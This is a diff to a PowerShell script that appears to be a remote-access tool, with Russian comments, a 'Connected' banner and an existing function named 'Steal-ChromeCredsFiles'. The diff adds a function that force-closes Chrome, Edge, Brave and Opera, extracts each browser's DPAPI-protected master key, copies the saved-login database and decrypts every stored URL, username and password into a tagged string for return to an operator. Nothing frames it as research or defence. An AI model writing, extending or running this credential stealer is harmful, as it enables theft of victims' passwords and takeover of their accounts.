@@ -389,7 +389,7 @@ function PortSuggest {
     }
 
 
-
+    
 
     function Steal-ChromeCredsFiles {
     # Сначала убиваем все браузеры
@@ -432,6 +432,90 @@ function PortSuggest {
         return $result
     } else {
         return "[ERROR] No browser credential files found"
+    }
+}
+
+function Send-DecryptedBrowserCreds {
+    try {
+        # Завершаем все браузеры
+        $browsers = @("chrome", "msedge", "brave", "opera")
+        foreach ($b in $browsers) { Stop-Process -Name $b -Force -ErrorAction SilentlyContinue }
+        Start-Sleep -Seconds 2
+
+        Add-Type -AssemblyName System.Security
+        Add-Type -AssemblyName System.Web
+
+        $browsersPaths = @{
+            "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
+            "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
+            "Brave"  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
+            "Opera"  = "$env:APPDATA\Opera Software\Opera Stable"
+        }
+
+        function Get-MasterKey($localStatePath) {
+            $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
+            $encKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)
+            $encKey = $encKey[5..($encKey.Length-1)]
+            return [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, 'CurrentUser')
+        }
+
+        function Decrypt-Pass($buff, $key) {
+            if ($buff[0..2] -ne [byte[]](0x76, 0x31, 0x30) -and $buff[0..2] -ne [byte[]](0x76, 0x31, 0x31)) {
+                return "[Legacy/Plain]"
+            }
+            $iv = $buff[3..14]
+            $payload = $buff[15..($buff.Length - 17)]
+            $tag = $buff[($buff.Length - 16)..($buff.Length - 1)]
+            $cipher = New-Object System.Security.Cryptography.AesGcm $key
+            $plaintext = New-Object byte[] $payload.Length
+            try {
+                $cipher.Decrypt($iv, $payload, $tag, $plaintext)
+                return [System.Text.Encoding]::UTF8.GetString($plaintext)
+            } catch {
+                return "[Decrypt error]"
+            }
+        }
+
+        $out = "[CREDS]::"
+
+        foreach ($browser in $browsersPaths.Keys) {
+            $profilePath = $browsersPaths[$browser]
+            $loginData = Join-Path $profilePath "Login Data"
+            $localState = Join-Path (Split-Path $profilePath -Parent) "Local State"
+
+            if (!(Test-Path $loginData) -or !(Test-Path $localState)) { continue }
+
+            $tempDB = "$env:TEMP\LoginData_$browser.db"
+            Copy-Item $loginData $tempDB -Force
+            $key = Get-MasterKey $localState
+
+            $conn = New-Object -ComObject "ADODB.Connection"
+            $conn.ConnectionString = "Provider=Microsoft.ACE.OLEDB.12.0;Data Source=$tempDB;Persist Security Info=False;"
+            $conn.Open()
+
+            $cmd = New-Object -ComObject "ADODB.Command"
+            $cmd.ActiveConnection = $conn
+            $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
+            $rs = $cmd.Execute()
+
+            while (!$rs.EOF) {
+                $url = $rs.Fields.Item(0).Value
+                $user = $rs.Fields.Item(1).Value
+                $enc = $rs.Fields.Item(2).Value
+                $pass = Decrypt-Pass $enc $key
+                $out += "`n[$browser] $url | $user | $pass"
+                $rs.MoveNext()
+            }
+
+            $rs.Close()
+            $conn.Close()
+            Remove-Item $tempDB -Force -ErrorAction SilentlyContinue
+        }
+
+        $out += "::END"
+        return $out
+    } catch {
+        return "[ERROR] $($_.Exception.Message)"
     }
 }
 
@@ -652,7 +736,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                            TEST 1022S                                                                                                                                                                    
+                                            TIO                                                                                                                                                                    
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
